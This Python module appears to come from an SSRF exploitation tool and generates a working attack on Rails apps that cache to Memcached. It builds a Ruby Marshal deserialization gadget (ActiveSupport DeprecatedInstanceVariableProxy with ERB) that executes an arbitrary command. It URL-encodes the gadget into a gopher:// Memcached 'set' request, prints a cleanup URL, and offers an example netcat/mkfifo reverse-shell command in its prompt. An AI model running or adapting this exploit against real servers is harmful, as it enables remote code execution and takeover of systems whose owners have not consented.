from .base import *

class RbMemcached(GENERATOR):
    requirement = ["command"]
    def __init__(self, parser,options={}):
        if options["port"] == 0:
            options["port"] = 11211
        super().__init__(parser,options)
        self.set_requirement([])
        arg = self.get_requirement()
        if arg.command == "":
            self.command = self.wizard()
        else:
            self.command = arg.command

    def wizard(self):
        print("Example: rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l " + "HOST_IP" + " 1234 > /tmp/f")
        command = input("\033[96m" +"Give command you want to run in Memcached Server: "+ "\033[0m")
        return command

    def generate(self):
        cmd = self.command
        payload = """\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0e@instanceo:\x08ERB\x06:\t@srcI\"""" + chr(len(cmd)+10)
        payload += "%x(" + cmd + """);\x06:\x06ET:\x0c@method:\x0bresult:\t@varI"\x0c@result\x06;\tT:\x10@deprecatoro:\x1fActiveSupport::Deprecation\x06:\x0e@silencedT"""
        self.set_mode(PAYLOAD_TYPE.NONE).set_payload(get_payload(payload)) 
        return super().generate()

    def tailcall(self):
        print("\033[04m" + f"gopher://{self.host}:{self.port}/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m")
        print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
        return

def get_payload(payload):
    payload_len = len(payload)
    payload = urllib.parse.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
    finalpayload = "%0d%0aset%20SpyD3r%204%2060%20" + str(payload_len) + "%0d%0a" + payload + "%0d%0a"
    return finalpayload